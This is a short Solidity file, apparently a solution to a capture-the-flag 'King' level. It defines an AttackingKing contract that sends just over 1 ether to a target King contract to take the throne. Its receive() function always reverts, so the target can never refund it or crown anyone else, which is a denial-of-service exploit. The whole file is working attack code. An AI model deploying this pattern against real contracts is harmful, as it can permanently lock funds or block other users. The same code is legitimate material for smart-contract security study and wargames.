// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        King king = King(payable(contractAddress));
        address(king).call{value: 1000000000000000001 wei}("");
    }

    receive() external payable {
        revert();
    }
}
